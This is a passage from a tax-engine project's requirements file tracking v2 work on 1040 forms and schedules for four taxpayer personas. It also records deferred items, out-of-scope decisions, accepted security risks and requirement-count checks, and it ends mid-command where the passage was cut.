**Opened 2026-08-15 by owner decision**, triggered by `.planning/PERSONA-COVERAGE.md`, which
measured the engine against four taxpayers: a retiree, a non-profit employee, a FAANG engineer
and a startup founder. One of the four is supported. One computes a *wrong* return. Two refuse.

**These 25 requirements are counted separately from v1's 95** and do not move v1's completion
figure. v1 remains what it always was: a 65+ TY2025 return with brokerage, dependents and
itemizing, which is complete apart from the eight open MAINT items.

> **Read the ordering constraint before planning any of this.** TAX-19 (computable tripwires)
> comes first and is not negotiable. Every requirement below adds a form the engine will
> compute, and each one that lands *without* TAX-19 widens the window in which the engine
> answers confidently and wrongly. The survey's central finding is that declaration-driven
> scoping cannot see a tax that triggers on a threshold from data the engine already holds —
> so a $300k W-2 silently understates by ~$900 today. Adding forms before closing that is
> building faster on the one foundation known to be cracked.

### The Product Path (EXEC, PROV)

- [ ] **EXEC-14** *(M2, T0)*: The 1040 engine reachable from a stored guest program — **via
      `guestCtx`, never via a server tool.** `guestCtx` already carries pure non-effect helpers
      (`step`, `pure`, `centsFromString`, `centsToString`) alongside the four frozen CAS
      commands, and `_CasOpIsExactlyTheFourCommands` pins the *effect* vocabulary, not the
      context. `form1040Report` and the dialect validators join that pure list. The agent still
      authors the program; the program calls the engine and decides what to report. **This is
      the deliberate alternative to the forbidden `finance_compute_1040` tool** — see Out of
      Scope, where the distinction is recorded and the tool re-affirmed as forbidden.
- [ ] **PROV-09** *(M2, T0)*: A real return produced through the product path end to end —
      documents stored via `evo_add`, a program stored in CAS and executed by `fjs_run`, the
      result written as a `vnd.fjs.run` record. This is what makes Phase 19's provenance header
      and PROV-05's pinned reproduction apply to an actual 1040 rather than to a fixture; today
      neither has ever run against one.

### The Safety Net (TAX)

- [ ] **TAX-19** *(M2, T0)*: **Computable tripwires** — a table of (predicate over the stored
      documents) → (kind that MUST have been declared), asserted before any line is computed.
      Box 5 over the Additional Medicare Tax threshold implies `scheduleTwoTaxes`; any 1099-NEC
      implies self-employment; non-zero 1099-R box 3 implies capital-gain treatment. This is
      the complement to `fjs/return/scope`'s declaration-driven guard, not a replacement:
      that guard is sound against the store-driven alternative for the reason its own docstring
      records, but it rests on the taxpayer knowing what they owe — which is the thing they
      came to a tax engine not to have to know. Converts silent understatement into refusal.

### FAANG: Schedule 2 Populated (TAX)

- [ ] **TAX-20** *(M2, T1)*: **Form 8959**, Additional Medicare Tax — 0.9% above $200,000
      single / $250,000 MFJ / $125,000 MFS, thresholds statutory and **not inflation-indexed**.
      Feeds Schedule 2 line 11 → 1040 line 23. Mandatory, not elective: this is what blocks
      every high-wage return today.
- [ ] **TAX-21** *(M2, T1)*: **Form 8960**, Net Investment Income Tax — 3.8% on the lesser of
      net investment income or MAGI over the same unindexed thresholds. Note AGENTS-relevant
      hazard: this MAGI has its own add-back list, so TAX-15's "no variable named `magi`" rule
      applies with full force.
- [ ] **TAX-22** *(M2, T2)*: `scheduleTwoTaxes` splits from one coarse refused kind into
      per-line kinds, so what remains refused on Schedule 2 is nameable. Reclassify **only**
      the lines actually wired, in the same commit — the wire-before-reclassify discipline
      Phases 12.1, 13 and 20 all followed.

### Non-Profit: Schedule 1 Part II and Schedule 3 (TAX, DOC)

- [x] **TAX-23** *(M2, T2)*: **Schedule 1 line 21**, student loan interest deduction, with its
      phase-out. Today a hard zero — the single largest silent overstatement for this persona.
- [x] **TAX-24** *(M2, T2)*: **Schedule 1 line 11**, educator expenses; **line 13**, HSA
      deduction (Form 8889). Both hard zeros today.
- [x] **TAX-25** *(M2, T2)*: **Form 8880**, the Saver's Credit → Schedule 3 line 4.
- [x] **TAX-26** *(M2, T2)*: **Form 8863**, American Opportunity and Lifetime Learning credits
      → Schedule 3 line 3 and 1040 line 29.
- [ ] **TAX-27** *(M2, T2)*: **Earned Income Credit** → 1040 line 27. **NOT DELIVERED as a
      computation — deliberately, and the box stays unchecked because of it.** Phase 25 shipped a
      named refusal plus a fact-by-fact spec, which is honest work and the right outcome, but it is
      not the credit. A `[x]` here would tell every count derived from these checkboxes that EIC
      computes. It does not. Re-scoped: the refusal and the spec are done; the computation needs a
      profile widening and belongs to a later phase.
      **The sentence above is what Phase 25 found to be false**:
      the existing Schedule 8812 dependent model carries almost none of §32(c)(3)'s
      qualifying-child rules. `dependents` was built for a two-fact test (age under 17, an
      employment-valid SSN); §32(c)(3) needs a checked relationship vocabulary, full-time-student
      status, permanent and total disability, and residency *in the United States* for more than
      half the year, and §32(c)(1) needs three more about the filer. The refusal now names all
      seven, and `fjs/todo/tax-27-earned-income-credit.md` carries the fact-by-fact analysis and
      the five things a future phase must add. A wrong EIC is the most audited figure on the
      return; shipping a partial one was the alternative and was rejected.
- [x] **DOC-19** *(M2, T2)*: `vnd.fjs.adjustments` — the taxpayer-asserted record behind the
      Schedule 1 Part II adjustments, following `vnd.fjs.medical_expenses` exactly: no IRS
      information return reports educator expenses or HSA contributions to the filer, so the
      dialect is asserted rather than transcribed, and carries no computed total.

### Retiree Completion (TAX)

- [x] **TAX-28** *(M2, T2)*: **Qualified Charitable Distributions.** A QCD is a taxpayer
      *election*, not a 1099-R box — the custodian reports the gross distribution and the filer
      writes "QCD" beside 1040 line 4b. Today the engine taxes it in full and **overstates
      silently**. Needs a profile-level election plus the line-4b reduction, with the $108,000
      (TY2025, indexed) per-person cap.

      **Shipped (Phase 26), with one deliberate deviation and two named gaps.** The election
      reduces 1040 line 4b while line 4a stays gross, capped at §408(d)(8)(A)'s $108,000 per
      INDIVIDUAL (`fjs/tax/params`, with its indexing history and a citation, never a literal).

      *The deviation*: the election is **document-level, not profile-level** — a new
      `vnd.fjs.ira` dialect rather than fields on `vnd.fjs.return_profile`. Three reasons, all
      of which the profile cannot meet: the cap is per person and the profile carries no TIN at
      all; each gift must name the distribution it came out of by `(payerTin, accountNumber)`,
      which is what makes "this came from a 401(k), not an IRA" and "this exceeds the
      distribution it claims to come from" refusable rather than merely wrong; and a joint
      return has two elections, not one.

      *Gap 1 — the 70½ test is ASSERTED, not derived, and its absence REFUSES.* §408(d)(8)(B)(ii)
      requires age 70½ **at the time of the distribution**. This engine cannot determine that:
      **no birth date is stored anywhere in this repository**, the nearest fact is 1040 line
      12d's `taxpayerBornBeforeJan2_1961` (a **65** test, four and a half years short), and even
      a birth date would not settle a test taken at a *date* the engine only has as 1099-R box
      13 free text. The one derivable direction — attaining 70½ in 2025 implies the 12d box —
      IS checked, so an unchecked box contradicts the assertion and refuses. Residual: on a
      joint return the check uses the UNION of the two 12d boxes, because no TIN links a record
      to a person, so a 60-year-old spouse's QCD passes on the elder's box.

      *Gap 2 — §408(d)(8)(F)'s one-time split-interest election refuses by name*, quoting both
      its own $54,000 sub-cap and the $108,000 it sits inside. It is once per LIFETIME, spanning
      years this engine cannot see, and needs a statement attached to the return.
- [ ] **TAX-29** *(M2, T2)*: **Form 8606**, nondeductible IRA basis and the pro-rata rule.
      Without it, after-tax IRA money is taxed twice. Also the piece that makes a backdoor Roth
      computable, which is why it serves the FAANG persona as much as the retiree.

      **UNTICKED DELIBERATELY: the first sentence ships and the second does not.** Phase 26
      built Form 8606 **Part I** in full — §408(d)(2)'s pro-rata rule over the **aggregated**
      year-end value of every traditional/SEP/SIMPLE IRA one person owns (a two-IRA case is
      proven distinct from a one-IRA case at the same total), the prior year's line 14 carried
      forward through a new `vnd.fjs.prior_year_ira_basis` dialect, and line 15c reaching 1040
      line 4b. So after-tax IRA money is no longer taxed twice, which is the requirement's own
      stated harm.

      **But a backdoor Roth is not computable, and this requirement says it should be.** A
      backdoor Roth is a nondeductible contribution *plus a conversion to a Roth IRA*; the
      conversion is Form 8606 **Part II**, which is refused by name (`netAmountConvertedToRoth\
      Iras`), because line 18 is a second amount landing on 1040 line 4b beside line 15c and
      §408A(d)(3)'s recapture regime is unmodelled. **Part III** (distributions from Roth IRAs)
      is likewise refused, detected off Form 1099-R box 7a codes J/T/Q rather than off an
      assertion, since a Roth distribution arrives as a document. So the FAANG half of this
      requirement is untouched and the box stays empty.

      Also refused by name rather than ignored: an absent aggregated year-end value (the
      pro-rata denominator, which no document reports and which has no defensible default), an
      outstanding rollover or recharacterization, a Form 8915-F qualified disaster distribution,
      and a stored basis with no `vnd.fjs.ira` record beside it.

### Startup Founder: Self-Employment (DOC, TAX) — reversed from Out of Scope 2026-08-15

- [x] **DOC-20** *(M2, T2)*: `vnd.fjs.1099nec` — nonemployee compensation. Three boxes and
      genuinely a morning's work; the Out-of-Scope entry that forbade it until today called
      that simplicity "a trap" and was right about what follows.

      Delivered 2026-08-16. Box 1, box 2 (the direct-sales checkbox), box 3 (the printed
      form's own reserved box, refused when non-zero), box 4 and boxes 5-7 as an ARRAY of
      state rows. **Box 2 is not inert**: a ticked one means the recipient resells consumer
      products, so the goods are inventory (Part III) and the resale proceeds appear on no
      information return — `fjs/schedule/c` refuses it by name rather than reading a
      reseller's wholesale purchases as their gross receipts.
- [x] **DOC-21** *(M2, T2)*: `vnd.fjs.business_expenses` — the taxpayer-asserted record behind
      Schedule C Part II, categorised to the printed form's own expense lines. Same asserted
      shape as DOC-19 and `vnd.fjs.medical_expenses`.

      Delivered 2026-08-16. Three departures from DOC-19, each stated at the site: one
      document is one BUSINESS (so `accountNumber` is required and DOC-01's subject key
      separates two Schedule Cs), the date rule is the strict same-year one, and a negative
      amount is refused. It also carries
      `grossReceiptsFullyReportedOnForms1099Nec` — a field that exists only so an
      uncomputable return can say so out loud, because §6041A requires a 1099-NEC only at
      $600 and only from a trade or business, so a Schedule C line 1 read from Forms
      1099-NEC alone would silently understate gross receipts.
- [x] **TAX-30** *(M2, T3)*: **Schedule C**, all parts, one named pure function per printed
      line group, feeding Schedule 1 line 3 → 1040 line 8.

      Delivered 2026-08-16, and the tick means the SCHEDULE, not the self-employed return.
      Eighteen of the twenty-five printed expense lines compute, Part I's income arithmetic
      and Part V's line 48 compute, and line 31 reaches Schedule 1 line 3 → 1040 line 8
      through Schedule 1's own Part I total. Parts III and IV are named functions for named
      printed parts that refuse. Seven expense categories refuse by name, each naming the
      form or the facts that would supply it.

      **Three refusals bound what a taxpayer can actually file, and they are the reason
      Phase 28 exists rather than being optional:**

      - **A net LOSS refuses.** The printed form's own "if a loss, you must go to line 32"
        is an at-risk determination §465 makes from a multi-year basis history no document
        here holds; §469 and §461(l) stand behind it. The arithmetic loss is an upper bound
        on the deductible loss, so letting it reach Schedule 1 line 3 would understate tax
        while moving AGI and everything downstream of it.
      - **A net profit at or above §1402(b)(2)'s $400 refuses**, because self-employment tax
        is NOT elective and the scope guard only refuses a kind the taxpayer declares. A
        filer declaring `businessIncomeOrLoss` alone would otherwise have received a
        complete-looking 1040 with Schedule 2 line 4 at zero — about $7,000 short on a
        $50,000 profit. **TAX-31 (Phase 28) lifted this on 2026-08-16**: the refusal is
        deleted, Schedule SE computes, and a $50,000 profit now carries $7,064.78 of
        self-employment tax to Schedule 2 line 4.
      - **A statutory-employee W-2 refuses.** `vnd.fjs.w2`'s `box13StatutoryEmployee` had
        been modeled since the dialect was written and read by nothing; those wages belong
        on Schedule C line 1, not 1040 line 1a, and this engine puts them on line 1a where
        no expense can reach them.

      So the largest Schedule C this engine would put on a 1040 was one whose net profit
      was under $400. Everything above that computed every printed line and then refused,
      by name, at the last step — **until TAX-31 landed on 2026-08-16**. Of the three
      refusals above, the second is gone and the other two stand unchanged: a net LOSS
      still refuses on §465 grounds, and a statutory-employee W-2 still refuses.
- [x] **TAX-31** *(M2, T3)*: **Schedule SE**, self-employment tax — the 92.35% net-earnings
      factor, the Social Security wage base ceiling coordinated with W-2 box 3 wages already
      counted, and the uncapped Medicare component. Feeds Schedule 2 line 4, and its deductible
      half feeds Schedule 1 line 15 (a hard zero today). **Depends on TAX-20/22**, since both
      land on Schedule 2.

      Delivered 2026-08-16, and every clause of the sentence above is real. Part I's twenty
      printed lines compute; line 12 reaches Schedule 2 line 4 → 1040 line 23 and line 13
      reaches Schedule 1 line 15 → 1040 line 10, out of ONE execution. The 92.35% factor is
      **derived** from §1401's two rates per §1402(a)(12) rather than stored, so the printed
      0.9235 has one source of truth. The wage base is shared with **Form W-2 box 3** (never box
      5) plus box 7, wages first, and matched on `recipientTin` so a spouse's wages cannot
      shelter the proprietor's earnings. Form 8959 Part II line 8 now reads Schedule SE line 6,
      which is what Phase 23 wrote its threshold coordination for.

      **Phase 27's §1402(b)(2) ceiling is gone**: a Schedule C net profit of any size now
      computes end to end, and the $400 question is asked once, on the form that prints it,
      against net EARNINGS rather than net profit.

      **What the tick does NOT mean.** Four printed things on this form still refuse by name:
      Part II's farm and non-farm **optional methods** (elective, and no document records an
      election), **church employee income** and §1402(g)'s Form 4029/4361 **exemption** (nothing
      on a W-2 marks either), Schedule F farm income on lines 1a/1b, and Form 4137/8919 amounts
      on lines 8b/8c. The first two are new `fjs/return/scope` kinds, so a taxpayer with either
      is told. A **non-joint** return carrying a Form W-2 issued to a different `recipientTin`
      with Social Security wages on it also refuses, because the wage base is per person and the
      engine cannot tell which of the two records is wrong.
- [ ] **TAX-32** *(M2, T3)*: **Form 8995 / 8995-A**, the QBI deduction → 1040 line 13a, with
      the SSTB phase-in and the W-2-wage/UBIA limitations. Depends on TAX-30.

      **PARTIALLY delivered 2026-08-16, and the box stays unchecked because two of the three
      things this requirement names were not built.** Form **8995**, the simplified
      computation, is complete: all seventeen printed lines, reaching 1040 line 13a. Qualified
      business income is Schedule C net profit **reduced by the deductible half of
      self-employment tax** (§199A(c)(1)), which is the step most often missed and which lowers
      the deduction. Line 11's "taxable income before the QBI deduction" subtracts 1040 line 12
      **and line 13b**, because the 2025 face splits the old line 13 in two.

      Form **8995-A** is not modeled, so **the SSTB phase-in and the W-2-wage/UBIA limitations
      this requirement names do not exist**. Above §199A(e)(2)'s threshold ($197,300, or
      $394,600 on a joint return) the engine REFUSES by name, and the refusal states both
      limitations, the fact that a sole proprietor with no employees has no W-2 wages, and both
      directions the error would run. It fires only when there is qualified business income, so
      a high-income return with no business is untouched.

      Form 8995 lines 6-9, **qualified REIT dividends and PTP income**, are documented zeros:
      Form 1099-DIV box 5 is stored and read by nothing, and PTP income needs Schedule K-1
      (DOC-24, Phase 30). `qualifiedReitDividendsAndPtpIncome` is a new refused kind.

      **`vnd.fjs.business_expenses` gains one field**,
      `priorYearQualifiedBusinessLossCarryforward`. §199A(c)(2) carries a negative year forward
      and this engine holds one tax year; reading an absent carryforward as zero would overstate
      the deduction for the year-one-loss founder the section is written for, so absence is
      *unstated* and refuses, and `"0.00"` is the assertion that there was none.

      **No SSTB field is stored, deliberately.** §199A(d)(3) makes the SSTB question irrelevant
      below the threshold and the engine refuses above it, so the field would have no reader —
      the `box13StatutoryEmployee` defect Phase 27 found, avoided rather than repeated. It
      acquires a reader the day Form 8995-A is modeled.

### Equity Compensation and AMT (DOC, TAX)

- [x] **DOC-22** *(M2, T2)*: `vnd.fjs.form3921` — ISO exercise. Not filed with the return, but
      it carries the exercise price and FMV that drive both the AMT preference and basis.
      **Delivered (Phase 29.)** Boxes 1-6, the two per-share prices exactness-checked and the
      share count through the new `fjs/document/share_count`. The spread `(box 4 − box 3) × box 5`
      reaches Form 6251 line 2i and thence 1040 line 17, following the printed instructions' own
      order of operations (each product rounded, the subtraction last). The basis half of the
      requirement is NOT delivered: the AMT basis increase this exercise creates is a multi-year
      fact, refused by name at `amtDispositionOfProperty` (Form 6251 line 2k).
- [x] **DOC-23** *(M2, T2)*: `vnd.fjs.form3922` — ESPP transfer, carrying what a qualifying vs
      disqualifying disposition needs.
      **Delivered (Phase 29.)** All eight boxes, audited one by one against this requirement's own
      standard in `everyBoxADispositionNeedsRoundTripsVerbatim` — both holding-period endpoints,
      both fair market values (the qualifying and disqualifying rules read DIFFERENT ones), the
      price paid, the lookback price in box 8 whose ABSENCE is a fact, and the share count.
      **Nothing computes from it, and it is not a stored document with no reader**: a stored Form
      3922 alongside any reported sale REFUSES the return, naming the three facts that are
      missing (which sale, qualifying or disqualifying, and whether the ordinary-income element is
      already inside Form W-2 box 1).
- [ ] **TAX-33** *(M2, T3)*: **Form 6251**, Alternative Minimum Tax → Schedule 2 line 2. The
      hardest computation remaining in the project, and the reason an ISO exercise can generate
      tax on income never received.

      **The printed destination is line 2, not line 1, and this text has been corrected.** Every
      AMT reference says line 1, and that was true through TY2024; the TY2025 Schedule 2 (fetched
      2026-08-16) prints line 1 as "Additions to tax" (1a-1z) and line 2 as "Alternative minimum
      tax. Attach Form 6251". It matters: Form 6251 line 10 READS Schedule 2 line 1z, so an engine
      putting the AMT on line 1 would have the form reading its own output.

      **Phase 29 delivers Parts I and II and leaves this UNCHECKED for Part III.** What computes:
      lines 1a/1b, line 2a's standard-deduction add-back, line 2i's ISO spread, line 4's
      married-filing-separately add-back, the exemption and its 25% phase-out, the 26/28% schedule
      with its halved MFS breakpoint, and line 11's EXCESS over the regular tax — end to end, on a
      real fixture, at $292,479.00 of tax on income never received.

      What does not: **Part III**, the twenty-nine-line worksheet that reapplies the 0/15/20%
      preferential rates inside the AMT. Returns are not blanket-refused for it — Part III's own
      line 40 takes the SMALLER of its result and the flat 26/28% figure, so that figure is a
      rigorous upper bound and the engine returns an exact `$0.00` whenever the bound already
      loses to the regular tax. But a filer with a large ISO spread AND qualified dividends is
      exactly who this requirement's persona is, and that filer is refused. Fifteen §56/§57
      adjustments on Part I are also refused, each by its own kind and each naming the document
      or election that would supply it.
- [x] **TAX-34** *(M2, T2)*: **Form 8949 basis adjustment codes**, particularly code B for
      equity compensation. Brokers routinely report $0 or unadjusted basis on 1099-B for RSU
      and ESPP sales; without the adjustment the vested value is **taxed twice**. Form 8949
      already exists — this is the adjustment column and its codes, not a new form.
      **Delivered (Phase 29.)** All eighteen printed column (f) codes, in the table's own order,
      each with a TOTAL disposition — one emitted (B), two refused by name (D and W, each stating
      what a later phase has to decide), fifteen structurally unreachable with the input shape
      that would reach each one. Column (g) derives the printed worksheet's two presentations of
      one correction from box 12. **Nothing is adjusted that the taxpayer did not assert**: the
      correction is a stored `vnd.fjs.basis_correction` naming its Form 1099-B by CAS hash, and
      an assertion the engine cannot use is refused rather than dropped, in four different ways.
      The double taxation is PRICED end to end at **$49,467.75** of federal income tax on
      $150,000.00 of already-taxed wages.

### Pass-Through Income (DOC, TAX)

- [x] **DOC-24** *(M2, T3)*: `vnd.fjs.k1_1065` and `vnd.fjs.k1_1120s` — partnership and S-corp
      Schedule K-1. Two dialects, not one: the box numbering differs.
      **Delivered (Phase 30.)** Twenty-nine printed Part III fields on the 1065 face and
      twenty-two on the 1120-S, each compared against a hand-typed printed table in both
      directions. The "two dialects, not one" clause is *priced* rather than described: the two
      faces collide on printed boxes 4, 5, 6, 7, 8, 9 and 14, so a shared schema would read an
      S corporation's short-term capital gain as a partnership's royalty and would look for
      self-employment earnings in a box that, on the 1120-S face, holds a checkbox.
      `theBoxNumberingDiffersFromThePartnershipForm` and
      `theTwoScheduleK1SchemasAreNotTheSameSchema` are the two leaves that would redden if either
      dialect were ever "harmonised" onto the other's numbering.

      **Box 1 computes on both. Every other fixed-caption money box refuses by name when
      non-zero** — seventeen of eighteen on the 1065, twelve of thirteen on the 1120-S — each
      naming the real line elsewhere on the return it would have reached, because §702(a) and
      §1366(a)(1) require each separately stated item to be taken into account separately and a
      dropped one is an understatement.

      **1065 box G is a printed PAIR and exactly one tick is required.** §1402(a)(13) and
      §469(h)(2) both turn on partner type, and neither a general nor a limited default is
      available: the error is worth about 15.3% of 92.35% of the share in whichever direction it
      was made. A blob ticking neither or both is refused at storage.

      **The one field that is not a printed box** is the §469 material-participation
      determination, in a vocabulary shared by both dialects. It rides on the K-1 because §469 is
      applied activity by activity; absence is *unstated* and refuses at `fjs/schedule/e`; and
      §469(h)(2) OVERRIDES it for a limited partner, so an assertion of material participation
      beside a ticked "Limited partner" box is refused rather than honoured.

      The eight (1065) and six (1120-S) CODED boxes are arrays of `(code, amount)` rows, and their
      vocabulary belongs to `fjs/schedule/e` — the identical division `vnd.fjs.business_expenses`
      makes with `fjs/schedule/c`. A row's amount is absent-able, because box 20 code Z prints
      `STMT`.
- [ ] **TAX-35** *(M2, T3)*: **Schedule E** Parts II and III → Schedule 1 line 5. A founder
      with a partnership stake or S-corp shares cannot file without it.

      **Phase 30 delivers Part II and leaves this UNCHECKED for Part III.** The persona is
      unblocked — a founder with a partnership stake or S-corporation shares can file — but the
      requirement names two parts and one of them does not compute.

      What computes: Part II lines 27-32 from both K-1 dialects, and Part V's line 41, which is
      the destination the requirement names. Line 41 combines printed lines 26, 32, 37, 39 and 40,
      four of them documented zeros, and reaches **Schedule 1 line 5 → 1040 line 8 through
      Schedule 1's own Part I total** rather than by a side channel. The founder's
      self-employment tax is charged or not charged according to the entity: a general partner's
      1065 box 14 code A reaches printed Schedule SE line 2, which names that box in its own
      caption, and an S-corporation shareholder's share never does (Rev. Rul. 59-221). The pair
      is priced end to end at **$11,303.64 against $0.00** on the same $80,000.00, with the
      Schedule E halves asserted EQUAL so that "the only difference is the entity type" is a
      checked claim rather than a description.

      What does not: **Part III**, estates and trusts, which needs a Schedule K-1 (Form 1041) —
      a THIRD Schedule K-1 with its own box numbering again, where a beneficiary's box 5 is other
      portfolio income and a partner's box 5 is interest. This phase built the two dialects
      DOC-24 asked for and deliberately did not guess a third from them, because guessing a box
      numbering is the exact failure DOC-24 exists to prevent. Part III's printed lines are
      modeled here as documented zeros so line 41 adds them, and a beneficiary is refused by name.

      Parts I (rental real estate and royalties), IV (REMICs) and Part V's own line 40 (Form
      4835) are outside this requirement and each refuses by name through its own declared kind —
      the coarse `rentalRealEstateRoyaltiesPartnershipsSCorps` is split into **five**
      per-Schedule-E-part kinds, so a filer with rental property is told that Part I is what is
      missing rather than being refused for "Schedule E".

      **A LOSS refuses, per row**, consistently with Phase 27's Schedule C decision and for one
      more reason than it had: §704(d)/§1366(d) basis is a multi-year history the K-1's own
      §704(b) capital-account box is not, and §465 and §469 stand behind it exactly as they do on
      Schedule C line 32. Per row rather than on the line-32 total, because netting one entity's
      loss against another's profit before testing either is the arithmetic §704(d) exists to
      stop.

      **§199A is wired only in the direction that is honest.** A PRESENT 1065 box 20 code Z or
      1120-S box 17 code V refuses, because the components live on an attached statement this
      engine does not hold; an ABSENT one computes, under Reg. §1.199A-6(b)(3)(iii)'s presumption
      that an unreported share of positive qualified business income is zero.

      **Nothing is routed.** TAX-35 asks to route the separately stated items this engine already
      models and refuse the rest by name; every one of them refuses by name instead, quoting box,
      code and amount. Each routing — box 5 interest to 1040 line 2b, box 6b to line 3a, boxes
      8/9a to Schedule D — is a separate wiring into a line that already computes from its own
      document family, and a wrong one is a silent error in a figure that already looks right.
      That is the half of this requirement still open besides Part III.

### v2 Traceability

| REQ-ID | Tier | Phase | Persona unblocked |
|--------|------|-------|-------------------|
| EXEC-14, PROV-09 | T0 | 21 - The Last Mile | *all four — nothing is reachable today* |
| TAX-19 | T0 | 22 - Computable Tripwires | *all four — the safety net* |
| TAX-20, TAX-21, TAX-22 | T1 | 23 - Schedule 2 Populated | **FAANG employee** |
| TAX-23, TAX-24, DOC-19 | T2 | 24 - Schedule 1 Adjustments | **Non-profit worker** |
| TAX-25, TAX-26, TAX-27 | T2 | 25 - Schedule 3 Credits | Non-profit worker |
| TAX-28, TAX-29 | T2 | 26 - Retiree Completion | Retiree |
| DOC-20, DOC-21, TAX-30 | T3 | 27 - 1099-NEC and Schedule C | Startup founder |
| TAX-31, TAX-32 | T3 | 28 - Schedule SE and QBI | **Startup founder** — TAX-31 delivered; TAX-32 delivers Form 8995 only and stays open for 8995-A |
| DOC-22, DOC-23, TAX-33, TAX-34 | T3 | 29 - Equity Compensation and AMT | **FAANG employee** — DOC-22, DOC-23 and TAX-34 delivered; TAX-33 delivers Form 6251 Parts I and II and stays open for Part III |
| DOC-24, TAX-35 | T3 | 30 - Pass-Through Income | **Startup founder** — DOC-24 delivered; TAX-35 delivers Schedule E Part II end to end and stays open for Part III and for routing the separately stated items |

**25 requirements across 10 phases** — 120 in the document, 95 of them v1's. Each phase is a
vertical slice that ends with something that works: a persona whose return computes, or a named
refusal that replaces a silent wrong answer. No phase leaves a layer that only pays off later.

> **That figure read 26 in this document's first draft.** Written by hand, one over, in the same
> file whose central lesson is that hand-written counts drift — and caught within a minute by the
> re-derivation command below, which is the entire argument for having one. Both figures here are
> now derived:
> ```sh
> sed -n '/^## v1 Requirements/,/^## v2 Requirements/p' .planning/REQUIREMENTS.md | grep -cE '^- \[[ x]\] \*\*[A-Z]+-[0-9]+'   # 95
> sed -n '/^## v2 Requirements/,/^## v2 (Deferred)/p'   .planning/REQUIREMENTS.md | grep -cE '^- \[[ x]\] \*\*[A-Z]+-[0-9]+'   # 25
> grep -oE '^- \[[ x]\] \*\*[A-Z]+-[0-9]+' .planning/REQUIREMENTS.md | grep -oE '[A-Z]+-[0-9]+' | sort | uniq -d              # must be empty
> ```

---

## v2 (Deferred)

- **Remote transport** — HTTPS + OAuth + tenancy, which is what ChatGPT support requires.
  Explicitly a milestone, per the client decision above.
- **Child-process isolation** with a wall-clock kill. The only way to bound a synchronous
  runaway from outside; a reliability fix as much as a security one.
- **Network egress control.** `--permission` has no network permission (see Accepted Risks).
- **A real FunctionalScript source validator** built on `fjs/js/tokenizer` + `fjs/bnf`, *if*
  it is ever wanted — for portability, not security. Multi-week upstream work.
- **Upstream contributions**: the restricted interpreter as a generic runner, the exact
  arithmetic module, the CAS effect vocabulary, and the `detect` dialect registry.
- **TY2024 and earlier parameter sets**, once TY2025 is proven.
- **"What if" scenarios as a named capability.** Program execution largely dissolves the
  feature — a scenario is another agent-authored program over branched inputs — but shipping
  it as a tested, named capability is v2.
- **TaxCalcBench as a graded acceptance harness** (51 public cases), pending a licensing and
  input-format check.

---

## Out of Scope

- **PDF text extraction in code** — permanently, not deferred. OCR is the agent's own vision
  pass emitting structured JSON. No PDF library, no OCR engine, no third-party service.
- **CSV / OFX / QFX parsers** — the vision-to-dialect path covers ingestion; a second
  parallel parser stack duplicates it for marginal gain.
- **State tax returns** — store W-2 boxes 15–20 faithfully, compute nothing.
- ~~**1099-NEC and self-employment** — the three-box simplicity is a trap; the downstream is
  Schedule C / SE / QBI.~~ **REVERSED by the owner on 2026-08-15.** Struck through rather than
  deleted, because the reason it was written is still true and is now a warning to whoever
  builds it: the 1099-NEC dialect is a morning's work and Schedule C → Schedule SE → Form 8995
  is the largest single body of work in the project. It moves to **v2 Phases 27-28**, not into
  v1. The trigger was a coverage survey (`.planning/PERSONA-COVERAGE.md`) showing this one
  entry is the *entire* startup-founder persona.
- **Non-US jurisdictions.**
- **Multi-user operation** — no auth, no tenancy, no per-user store isolation in v1.
- **E-filing or transmission** — output is figures to review and transcribe.
- **A `finance_compute_1040` tool** — would destroy the thesis permanently. The agent would
  call it and never author a program again. **STILL OUT OF SCOPE, and re-affirmed on
  2026-08-15** — see EXEC-14, which reaches the same end by the opposite route. The
  "last mile" as described in the 2026-08-15 handoff (*"a server tool that reads stored
  documents, assembles `Form1040Inputs`, and calls `form1040Report`"*) **is precisely this
  forbidden tool**, and would have been built without anyone noticing had the survey not
  re-read this list. The engine reaches guest programs through `guestCtx`, which already
  carries pure non-effect helpers (`step`, `pure`, `centsFromString`, `centsToString`) — so
  the agent still authors the program, and the frozen `CasOp` effect vocabulary does not
  widen by a single entry.
- **A "tax engine" module** — recreates precisely the thing the architecture exists to avoid.

---

## Accepted Risks

Recorded because "security will be worked on later" is a decision, and a decision deserves
to be written down with its consequences rather than left implicit.

| Risk | Status |
|---|---|
| **`import()` runs a blob's module body with full Node privileges** before any effect is interpreted. The operation whitelist does not cover it. | Accepted for v1. Mitigated in part by SEC-01 (`--permission`) and SEC-02 (specifier allow-list). Not closed. |
| **No network permission in Node's permission model.** A malicious module body can `fetch()` the complete tax record out. | Accepted and unmitigated in-process. An OS-level control (container, `sandbox-exec`, egress rule) was offered and deferred. |
| **The trust chain is untrusted document → LLM → generated program → execution.** Injection is unusually easy because "write a program and run it" is the sanctioned action. | Accepted. The compensating control is provenance discipline: only documents the user obtained themselves, in a session they initiated. |
| **CAS has no delete.** A wrongly ingested document — a spouse's return, a screenshot with a password — cannot be removed. | Mitigated by DOC-02 (project-local store) and DOC-15 (`archived` flag). Retraction remains a policy question, not a capability. |

---

## Traceability

Populated by the roadmapper from [`.planning/ROADMAP.md`](ROADMAP.md).
**All 95 requirements map to a phase. No orphans, no duplicates.** One — TEST-03 — maps to a
*range* of phases ("Phases 8-15, standing") rather than to one; the older wording of this
sentence said "exactly one phase" and was false for that row alone.

> **Two of these 95 (DOC-18, TAX-18) were written AFTER the code shipped.** The `vnd.fjs.1099g`
> dialect and its Schedule 1 line 7 wiring were built mid-session on 2026-08-14 in response to
> a real taxpayer document that the scope guard refused, entirely outside the GSD structure —
> no requirement, no phase, no CONTEXT or VALIDATION artifact. The retrofit (2026-08-15,
> commit `8d00990` for the code) assigns the IDs, adds **Phase 20** to the roadmap labelled as
> written after the fact, and subjects the work to the same verification gate every other
> phase cleared. **It is recorded as retrofitted rather than presented as planned**, because
> the value of this table is that its history is true, not that it is tidy.

Milestones are `todo/plan.md`'s weeks and keep its names; phases are sliced underneath
them. Week 0 is research's addition in front of the plan's Week 1.

> **This table's `Status` column is a SECOND SOURCE, and it rots.** The checkbox on each
> requirement above is what executors update; this column is not, and until 2026-08-08
> **28 rows said `Pending` for requirements whose checkbox already said `[x]`** — drift
> accumulated across Phases 3 through 12.1. Both were reconciled on that date (72 complete,
> 21 pending, 93 total).
>
> Recompute rather than trusting either figure:
> ```sh
> # every row whose checkbox and Status disagree — must print nothing
> for r in $(grep -oE '^- \[[ x]\] \*\*[A-Z]+-[0-9]+\*\*' .planning/REQUIREMENTS.md | grep -oE '[A-Z]+-[0-9]+'); do
